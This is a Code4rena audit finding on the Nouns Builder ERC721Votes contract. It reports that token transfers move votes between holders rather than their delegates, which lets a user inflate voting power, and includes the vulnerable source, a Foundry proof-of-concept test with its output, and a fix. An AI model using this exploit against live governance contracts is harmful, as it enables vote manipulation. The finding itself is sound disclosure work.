{
  "Title": "[H-05] _transferFrom() can be used to indefinitely increase voting power",
  "Content": "# Lines of code\n\nhttps://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L268\n\n\n# Vulnerability details\n\n## `_transferFrom()` can be used to indefinitely increase voting power.\n### Impact\nIt is possible to indefinitely increase voting power by creating new accounts (addresses) and delegating. This will lead to unfair governance as a user can vote with more votes than actual.\n\n### Explanation\nThe `_transferFrom()`  does not move delegates from the src's delegates to the destination's delegates, instead, it moves directly from src to dest. (see recommendations and Code POC for better understanding)\n\n### Code POC\n```solidity\n// Insert this test case into Token.t.sol\n// Run: forge test --match-contract Token -vv\n\nimport \"forge-std/console.sol\";\n...\nfunction testIncreaseVotePower() public {\n        deployMock();\n\n        address voter1;\n        address voter2;\n        uint256 voter1PK;\n        uint256 voter2PK;\n\n        // Voter with 1 NFT voting power\n        voter1PK = 0xABC;\n        voter1 = vm.addr(voter1PK);\n        vm.deal(voter1, 1 ether);\n        // Second account created by same voter\n        voter2PK = 0xABD;\n        voter2 = vm.addr(voter2PK);\n\n\t\t// Giving voter1 their 1 NFT\n        vm.prank(founder);\n        auction.unpause();\n        vm.prank(voter1);\n        auction.createBid{ value: 0.420 ether }(2);\n        vm.warp(auctionParams.duration + 1 seconds);\n        auction.settleCurrentAndCreateNewAuction();\n\n        // Start Exploit\n        console.log(\"Initial Votes\");\n        console.log(\"voter1: \", token.getVotes(voter1));\n        console.log(\"voter2: \", token.getVotes(voter2));\n        \n        vm.prank(voter1);\n        token.delegate(voter2);\n        console.log(\"After Delegating Votes, voter1 -> delegate(voter2)\");\n        console.log(\"voter1: \", token.getVotes(voter1));\n        console.log(\"voter2: \", token.getVotes(voter2));\n\n        vm.prank(voter1);\n        token.transferFrom(voter1, voter2, 2); \n        console.log(\"After Token transfer, voter1 -transferFrom()-> voter2\");\n        console.log(\"voter1 votes: \", token.getVotes(voter1));\n        console.log(\"voter2 votes: \", token.getVotes(voter2));\n\n        vm.prank(voter2);\n        token.delegate(voter2);\n        console.log(\"After Delegating Votes, voter2 -> delegate(voter2)\");\n        console.log(\"voter1: \", token.getVotes(voter1));\n        console.log(\"voter2: \", token.getVotes(voter2));\n    }\n```\nExpected Output:\n```solidity\n[PASS] testVoteDoublePower() (gas: 3544946)\nLogs:\n  Initial Votes\n  voter1:  1\n  voter2:  0\n  After Delegating Votes, voter1 -> delegate(voter2)   \n  voter1:  1\n  voter2:  1\n  After Token transfer, voter1 -transferFrom()-> voter2\n  voter1 votes:  0\n  voter2 votes:  2\n  After Delegating Votes, voter2 -> delegate(voter2)   \n  voter1:  0\n  voter2:  3\n```\n### Recommendations\nLooking at [OpenZeppelin's ERC721Votes](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/6a8d977d2248cf1c115497fccfd7a2da3f86a58f/contracts/token/ERC721/extensions/draft-ERC721Votes.sol#L13) which I believe the team took reference from, it states:\n```\n* Tokens do not count as votes until they are delegated, because votes must be tracked which incurs an additional cost\n* on every transfer. Token holders can either delegate to a trusted representative who will decide how to make use of\n* the votes in governance decisions, or they can delegate to themselves to be their own representative.\n```\nThe current implementation does not follow this, and tokens count as votes without being delegated. To fix this issue, votes should only be counted when delegated.\n- I believe the issue is here on this [line](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L268)\n```solidity\n// Transfer 1 vote from the sender to the recipient\n        _moveDelegateVotes(_from, _to, 1);\n```\nWhere it should move from the delegate of `_from` to the delegate of `_to`. Suggested FIx:\n```solidity\n _moveDelegateVotes(delegation[_from], delegation[_to], 1);\n```\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/contests/2022-09-nouns-builder-contest",
  "Code": [
    {
      "filename": "src/lib/token/ERC721Votes.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\nimport { IERC721Votes } from \"../interfaces/IERC721Votes.sol\";\nimport { ERC721 } from \"../token/ERC721.sol\";\nimport { EIP712 } from \"../utils/EIP712.sol\";\n\n/// @title ERC721Votes\n/// @author Rohan Kulkarni\n/// @notice Modified from OpenZeppelin Contracts v4.7.3 (token/ERC721/extensions/draft-ERC721Votes.sol) & Nouns DAO ERC721Checkpointable.sol commit 2cbe6c7 - licensed under the BSD-3-Clause license.\n/// - Uses custom errors defined in IERC721Votes\n/// - Checkpoints are based on timestamps instead of block numbers\n/// - Tokens are self-delegated by default\n/// - The total number of votes is the token supply itself\nabstract contract ERC721Votes is IERC721Votes, EIP712, ERC721 {\n    ///                                                          ///\n    ///                          CONSTANTS                       ///\n    ///                                                          ///\n\n    /// @dev The EIP-712 typehash to delegate with a signature\n    bytes32 internal constant DELEGATION_TYPEHASH = keccak256(\"Delegation(address from,address to,uint256 nonce,uint256 deadline)\");\n\n    ///                                                          ///\n    ///                           STORAGE                        ///\n    ///                                                          ///\n\n    /// @notice The delegate for an account\n    /// @notice Account => Delegate\n    mapping(address => address) internal delegation;\n\n    /// @notice The number of checkpoints for an account\n    /// @dev Account => Num Checkpoints\n    mapping(address => uint256) internal numCheckpoints;\n\n    /// @notice The checkpoint for an account\n    /// @dev Account => Checkpoint Id => Checkpoint\n    mapping(address => mapping(uint256 => Checkpoint)) internal checkpoints;\n\n    ///                                                          ///\n    ///                        VOTING WEIGHT                     ///\n    ///                                                          ///\n\n    /// @notice The current number of votes for an account\n    /// @param _account The account address\n    function getVotes(address _account) public view returns (uint256) {\n        // Get the account's number of checkpoints\n        uint256 nCheckpoints = numCheckpoints[_account];\n\n        // Cannot underflow as `nCheckpoints` is ensured to be greater than 0 if reached\n        unchecked {\n            // Return the number of votes at the latest checkpoint if applicable\n            return nCheckpoints != 0 ? checkpoints[_account][nCheckpoints - 1].votes : 0;\n        }\n    }\n\n    /// @notice The number of votes for an account at a past timestamp\n    /// @param _account The account address\n    /// @param _timestamp The past timestamp\n    function getPastVotes(address _account, uint256 _timestamp) public view returns (uint256) {\n        // Ensure the given timestamp is in the past\n        if (_timestamp >= block.timestamp) revert INVALID_TIMESTAMP();\n\n        // Get the account's number of checkpoints\n        uint256 nCheckpoints = numCheckpoints[_account];\n\n        // If there are none return 0\n        if (nCheckpoints == 0) return 0;\n\n        // Get the account's checkpoints\n        mapping(uint256 => Checkpoint) storage accountCheckpoints = checkpoints[_account];\n\n        unchecked {\n            // Get the latest checkpoint id\n            // Cannot underflow as `nCheckpoints` is ensured to be greater than 0\n            uint256 lastCheckpoint = nCheckpoints - 1;\n\n            // If the latest checkpoint has a valid timestamp, return its number of votes\n            if (accountCheckpoints[lastCheckpoint].timestamp <= _timestamp) return accountCheckpoints[lastCheckpoint].votes;\n\n            // If the first checkpoint doesn't have a valid timestamp, return 0\n            if (accountCheckpoints[0].timestamp > _timestamp) return 0;\n\n            // Otherwise, find a checkpoint with a valid timestamp\n            // Use the latest id as the initial upper bound\n            uint256 high = lastCheckpoint;\n            uint256 low;\n            uint256 middle;\n\n            // Used to temporarily hold a checkpoint\n            Checkpoint memory cp;\n\n            // While a valid checkpoint is to be found:\n            while (high > low) {\n                // Find the id of the middle checkpoint\n                middle = high - (high - low) / 2;\n\n                // Get the middle checkpoint\n                cp = accountCheckpoints[middle];\n\n                // If the timestamp is a match:\n                if (cp.timestamp == _timestamp) {\n                    // Return the voting weight\n                    return cp.votes;\n\n                    // Else if the timestamp is before the one looking for:\n                } else if (cp.timestamp < _timestamp) {\n                    // Update the lower bound\n                    low = middle;\n\n                    // Else update the upper bound\n                } else {\n                    high = middle - 1;\n                }\n            }\n\n            return accountCheckpoints[low].votes;\n        }\n    }\n\n    ///                                                          ///\n    ///                          DELEGATION                      ///\n    ///                                                          ///\n\n    /// @notice The delegate for an account\n    /// @param _account The account address\n    function delegates(address _account) external view returns (address) {\n        address current = delegation[_account];\n        return current == address(0) ? _account : current;\n    }\n\n    /// @notice Delegates votes to an account\n    /// @param _to The address delegating votes to\n    function delegate(address _to) external {\n        _delegate(msg.sender, _to);\n    }\n\n    /// @notice Delegates votes from a signer to an account\n    /// @param _from The address delegating votes from\n    /// @param _to The address delegating votes to\n    /// @param _deadline The signature deadline\n    /// @param _v The 129th byte and chain id of the signature\n    /// @param _r The first 64 bytes of the signature\n    /// @param _s Bytes 64-128 of the signature\n    function delegateBySig(\n        address _from,\n        address _to,\n        uint256 _deadline,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) external {\n        // Ensure the signature has not expired\n        if (block.timestamp > _deadline) revert EXPIRED_SIGNATURE();\n\n        // Used to store the digest\n        bytes32 digest;\n\n        // Cannot realistically overflow\n        unchecked {\n            // Compute the hash of the domain seperator with the typed delegation data\n            digest = keccak256(\n                abi.encodePacked(\"\\x19\\x01\", DOMAIN_SEPARATOR(), keccak256(abi.encode(DELEGATION_TYPEHASH, _from, _to, nonces[_from]++, _deadline)))\n            );\n        }\n\n        // Recover the message signer\n        address recoveredAddress = ecrecover(digest, _v, _r, _s);\n\n        // Ensure the recovered signer is the voter\n        if (recoveredAddress == address(0) || recoveredAddress != _from) revert INVALID_SIGNATURE();\n\n        // Update the delegate\n        _delegate(_from, _to);\n    }\n\n    /// @dev Updates delegate addresses\n    /// @param _from The address delegating votes from\n    /// @param _to The address delegating votes to\n    function _delegate(address _from, address _to) internal {\n        // Get the previous delegate\n        address prevDelegate = delegation[_from];\n\n        // Store the new delegate\n        delegation[_from] = _to;\n\n        emit DelegateChanged(_from, prevDelegate, _to);\n\n        // Transfer voting weight from the previous delegate to the new delegate\n        _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));\n    }\n\n    /// @dev Transfers voting weight\n    /// @param _from The address delegating votes from\n    /// @param _to The address delegating votes to\n    /// @param _amount The number of votes delegating\n    function _moveDelegateVotes(\n        address _from,\n        address _to,\n        uint256 _amount\n    ) internal {\n        unchecked {\n            // If voting weight is being transferred:\n            if (_from != _to && _amount > 0) {\n                // If this isn't a token mint:\n                if (_from != address(0)) {\n                    // Get the sender's number of checkpoints\n                    uint256 nCheckpoints = numCheckpoints[_from]++;\n\n                    // Used to store the sender's previous voting weight\n                    uint256 prevTotalVotes;\n\n                    // If this isn't the sender's first checkpoint: Get their previous voting weight\n                    if (nCheckpoints != 0) prevTotalVotes = checkpoints[_from][nCheckpoints - 1].votes;\n\n                    // Update their voting weight\n                    _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes - _amount);\n                }\n\n                // If this isn't a token burn:\n                if (_to != address(0)) {\n                    // Get the recipients's number of checkpoints\n                    uint256 nCheckpoints = numCheckpoints[_to]++;\n\n                    // Used to store the recipient's previous voting weight\n                    uint256 prevTotalVotes;\n\n                    // If this isn't the recipient's first checkpoint: Get their previous voting weight\n                    if (nCheckpoints != 0) prevTotalVotes = checkpoints[_to][nCheckpoints - 1].votes;\n\n                    // Update their voting weight\n                    _writeCheckpoint(_to, nCheckpoints, prevTotalVotes, prevTotalVotes + _amount);\n                }\n            }\n        }\n    }\n\n    /// @dev Records a checkpoint\n    /// @param _account The account address\n    /// @param _id The checkpoint id\n    /// @param _prevTotalVotes The account's previous voting weight\n    /// @param _newTotalVotes The account's new voting weight\n    function _writeCheckpoint(\n        address _account,\n        uint256 _id,\n        uint256 _prevTotalVotes,\n        uint256 _newTotalVotes\n    ) private {\n        // Get the pointer to store the checkpoint\n        Checkpoint storage checkpoint = checkpoints[_account][_id];\n\n        // Record the updated voting weight and current time\n        checkpoint.votes = uint192(_newTotalVotes);\n        checkpoint.timestamp = uint64(block.timestamp);\n\n        emit DelegateVotesChanged(_account, _prevTotalVotes, _newTotalVotes);\n    }\n\n    /// @dev Enables each NFT to equal 1 vote\n    /// @param _from The token sender\n    /// @param _to The token recipient\n    /// @param _tokenId The ERC-721 token id\n    function _afterTokenTransfer(\n        address _from,\n        address _to,\n        uint256 _tokenId\n    ) internal override {\n        // Transfer 1 vote from the sender to the recipient\n        _moveDelegateVotes(_from, _to, 1);\n\n        super._afterTokenTransfer(_from, _to, _tokenId);\n    }\n}"
    }
  ]
}